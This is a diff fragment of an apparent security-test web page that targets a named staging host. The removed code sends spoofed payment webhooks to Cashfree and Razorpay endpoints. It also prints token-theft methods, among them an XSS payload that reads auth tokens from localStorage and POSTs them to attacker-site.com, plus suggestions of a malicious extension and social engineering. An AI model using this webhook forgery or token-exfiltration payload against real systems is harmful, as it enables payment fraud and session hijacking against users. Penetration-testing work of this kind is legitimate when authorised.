-            log('=== WEBHOOK SPOOFING TEST STARTED ===');
-            
-            const webhookEndpoints = [
-                {
-                    url: '/v1/webhooks/cashfree_webhook',
-                    method: 'POST',
-                    body: {
-                        "type": "PAYMENT_SUCCESS",
-                        "data": {
-                            "order_id": "test_order_123",
-                            "amount": 1000,
-                            "status": "SUCCESS"
-                        }
-                    }
-                },
-                {
-                    url: '/v3/sms_recharge/webhook_razorpay/captured',
-                    method: 'POST',
-                    body: {
-                        "payload": {
-                            "payment": {
-                                "entity": {
-                                    "id": "pay_test123",
-                                    "contact": "+919999999999",
-                                    "amount": 10000,
-                                    "currency": "INR",
-                                    "email": "test@example.com"
-                                }
-                            }
-                        }
-                    }
-                }
-            ];
-            
-            for (const webhook of webhookEndpoints) {
-                try {
-                    log(`Testing webhook: ${webhook.method} ${webhook.url}`);
-                    
-                    const response = await fetch(`${TARGET_BASE}${webhook.url}`, {
-                        method: webhook.method,
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(webhook.body)
-                    });
-                    
-                    log(`Status: ${response.status}`, response.status === 200 ? 'error' : 'success');
-                    
-                    if (response.status === 200) {
-                        log('🚨 CRITICAL: Webhook spoofing successful!', 'error');
-                        const data = await response.text();
-                        log(`Response: ${data}`);
-                    }
-                    
-                } catch (error) {
-                    log(`Error: ${error.message}`, 'error');
-                }
-            }
-            
-            log('=== WEBHOOK SPOOFING TEST COMPLETED ===\n');
-        }
-
-        function showTokenCaptureMethods() {
-            log('=== TOKEN CAPTURE METHODS ===');
-            log('⚠️  Note: Due to Same-Origin Policy, this page cannot directly access');
-            log('   localStorage/sessionStorage from ml-stage.farmartos.com');
-            log('');
-            log('🔍 Methods to capture tokens for testing:');
-            log('');
-            log('1. MANUAL METHOD (Recommended for testing):');
-            log('   a) Login to https://ml-stage.farmartos.com');
-            log('   b) Open DevTools (F12) → Application tab → Local Storage');
-            log('   c) Look for keys like: token, auth, jwt, access_token');
-            log('   d) Copy the value and paste it in the token input above');
-            log('');
-            log('2. NETWORK INTERCEPTION:');
-            log('   a) Login to FarmartOS');
-            log('   b) DevTools → Network tab');
-            log('   c) Make any API request');
-            log('   d) Look for Authorization header in request');
-            log('   e) Copy the Bearer token value');
-            log('');
-            log('3. XSS INJECTION (if you find XSS vulnerability):');
-            log('   Inject this payload on ml-stage.farmartos.com:');
-            log('   ```javascript');
-            log('   // Capture token from localStorage');
-            log('   let token = null;');
-            log('   for (let key in localStorage) {');
-            log('       if (key.includes("token") || key.includes("auth")) {');
-            log('           token = localStorage.getItem(key);');
-            log('           break;');
-            log('       }');
-            log('   }');
-            log('   // Send to attacker server');
-            log('   fetch("https://attacker-site.com/steal", {');
-            log('       method: "POST",');
-            log('       body: JSON.stringify({token: token})');
-            log('   });');
-            log('   ```');
-            log('');
-            log('4. BROWSER EXTENSION (for testing):');
-            log('   Create extension that runs on ml-stage.farmartos.com');
-            log('   and captures tokens from localStorage');
-            log('');
-            log('5. SOCIAL ENGINEERING:');
-            log('   Trick user into visiting malicious page while logged in');
-            log('   and use XSS or other methods to steal tokens');
-            log('');
-            log('=== END TOKEN CAPTURE METHODS ===\n');
-        }
-
-        // Auto-run basic test on page load
-        window.onload = function() {
-            log('🔒 FarmartOS CSRF Security Test Tool Loaded');
-            log('Target: https://ml-stage.farmartos.com');
-            log('Origin: ' + window.location.origin);
-            log('Ready for testing...\n');
-        };
-    </script>
+  <!-- CryptoJS for HMAC signatures -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </body>
 </html>
